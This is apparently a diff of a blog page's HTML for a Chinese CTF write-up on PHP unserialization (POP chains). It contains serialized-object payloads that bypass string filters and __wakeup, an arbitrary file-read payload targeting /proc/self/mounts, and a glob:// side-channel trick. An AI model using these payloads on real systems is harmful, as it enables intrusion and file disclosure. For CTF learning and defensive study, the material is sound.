@@ -9,7 +9,7 @@
 <meta property='og:description' content='PHP 反序列化实例练习 实例1 来源：php反序列化利用——POP链构造实例 &amp;lt;?php // 题目中的第一个Class class MyDirectory { public $name; // 构造器，新的对象建立时被调用 public function'>
 <meta property='og:url' content='https://ginkgo.org.cn/posts/php_unserialize_examples/'>
 <meta property='og:site_name' content='Under The Ginkgo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='web_security' /><meta property='article:tag' content='php' /><meta property='article:tag' content='unserialize' /><meta property='article:published_time' content='2022-06-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-06-19T23:54:32&#43;01:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='web_security' /><meta property='article:tag' content='php' /><meta property='article:tag' content='unserialize' /><meta property='article:published_time' content='2022-06-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-07-10T22:41:06&#43;01:00'/>
 <meta name="twitter:title" content="PHP 反序列化实例练习">
 <meta name="twitter:description" content="PHP 反序列化实例练习 实例1 来源：php反序列化利用——POP链构造实例 &amp;lt;?php // 题目中的第一个Class class MyDirectory { public $name; // 构造器，新的对象建立时被调用 public function">
     <link rel="shortcut icon" href="/img/favicon.ico" />
@@ -344,7 +344,7 @@ if (!doNotTrack) {
 <p>源码内我们标出了三个限制点： <!-- raw HTML omitted --></p>
 <ul>
 <li>A, 对GET输入检查是否包含&rsquo;users&rsquo;字符串，我们可以通过修改序列化字符串中的s为S，这样就可以支持利用16进制编码来进行绕过， <code>s:4:&quot;user&quot;; -&gt; S:4:&quot;use\72&quot;;</code> <!-- raw HTML omitted --></li>
-<li>B, 我们在序列化的字符串中对于 <code>MyFile-&gt;name</code> 会被 <code>__wakeup</code> 给替换掉，我们可以利用修改属性来绕过 <code>__wakeup</code> 的替换（此方法适用于PHP 7.0.10），这里我们使用浅copy来对可控变量 <code>$this-&gt;user</code> 来进行过滤 <!-- raw HTML omitted --></li>
+<li>B, 我们在序列化的字符串中对于 <code>MyFile-&gt;name</code> 会被 <code>__wakeup</code> 给替换掉，我们可以利用修改属性来绕过 <code>__wakeup</code> 的替换（此方法只适用于PHP5 &lt; 5.6.25, PHP7 &lt; 7.0.10），这里我们使用浅copy来对可控变量 <code>$this-&gt;user</code> 来进行过滤 <!-- raw HTML omitted --></li>
 <li>C, 无法直接获取文件名，可以配合 <code>glob://</code> 协议来测信道出 flag 的文件名字 <!-- raw HTML omitted --></li>
 </ul>
 <p>因此我们构造 payload： <!-- raw HTML omitted --></p>
@@ -368,7 +368,7 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> 
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">// 得到序列化结果:
-</span></span></span><span class="line"><span class="cl"><span class="c1">// O:6:&#34;MyFile&#34;:2:{s:4:&#34;name&#34;;s:0:&#34;&#34;;S:4:&#34;use\\72&#34;;R:2;}
+</span></span></span><span class="line"><span class="cl"><span class="c1">// O:6:&#34;MyFile&#34;:2:{s:4:&#34;name&#34;;s:0:&#34;&#34;;S:4:&#34;use\72&#34;;R:2;}
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="c1">// 文件任意读 payload：
 </span></span></span><span class="line"><span class="cl"><span class="c1">// input=O:6:&#34;MyFile&#34;:2: {s:4:&#34;name&#34;;s:0:&#34;&#34;;S:4:&#34;us\65r&#34;;R:2;}&amp;user=/proc/self/mounts
@@ -508,8 +508,9 @@ O%3A4%3A%22Name%2 <code>3</code> %3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs
         </figcaption>
 </figure>
  <!-- raw HTML omitted --></p>
-<p>参考：[[<a class="link" href="https://segmentfault.com/a/1190000022534926"  target="_blank" rel="noopener"
-    >https://segmentfault.com/a/1190000022534926</a>][CTF-Web-[极客大挑战 2019]PHP <!-- raw HTML omitted --></p>
+<p>参考： <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://segmentfault.com/a/1190000022534926"  target="_blank" rel="noopener"
+    >CTF-Web-[极客大挑战 2019]PHP</a> <!-- raw HTML omitted --></p>
 
 </section>
 
@@ -551,7 +552,7 @@ O%3A4%3A%22Name%2 <code>3</code> %3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs
 
 
         <span>
-            Last updated on Jun 19, 2022 23:54 BST
+            Last updated on Jul 10, 2022 22:41 &#43;0100
         </span>
     </section></footer>
 
